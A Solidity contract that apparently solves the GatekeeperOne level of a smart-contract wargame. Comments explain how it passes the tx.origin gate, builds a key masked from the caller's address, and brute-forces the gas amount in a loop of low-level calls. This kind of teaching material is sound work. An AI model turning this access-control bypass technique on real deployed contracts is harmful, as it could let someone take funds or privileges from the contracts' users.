// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract UnlockOne {
    
    function unlock(address _gatekeeperOne) public {
        /*Calling the function through this contract already passes Gate 1 as 
          tx.origin != msg.sender
        */

        /*
        Gate 3 key must be bytes8 variable e.g. XYWZ where
        1. WZ == Z so W: must be all zeros.
        2. WZ != XYWZ so XY must not be all zeros
        3. WZ == uint16(tx.origin)
        So let's use the wallet address and bitwise it to ensure the first condition
        */

        /*
        In Solidity 0.8.0
        Conversions between bytesX and uintY of different size are now disallowed
        due to bytesX padding on the right and uintY padding on the left which 
        may cause unexpected conversion results. The size must now be adjusted 
        within the type before the conversion.
        */
        uint64 wallet = uint64(uint160(tx.origin));
        bytes8 key = bytes8(wallet & 0xFFFFFFFF0000FFFF);
    
        /* Gate 2 requires figuring out how much gas the function consumes to make
        it go through the second gate.
        As it is gas dependant as well as compiler dependant it may vary a bit.
        Average gas was between 210 and 250. 
        Let's run it through a loop to guess when the gas is correct to pass
        */
    
        // Using call (vs. an abstract interface) prevents reverts from propagating.
        bytes memory encodedParams = abi.encodeWithSignature(("enter(bytes8)"), key);
        
        // Let's start at 180 gas and go all the way to 300 gas
        for (uint256 i = 0; i < 120; i++) {
            (bool result, ) = address(_gatekeeperOne).call{gas: i + 180 + 8191 * 2}(encodedParams);
            if(result) {
                break;
            }
        }
    }
}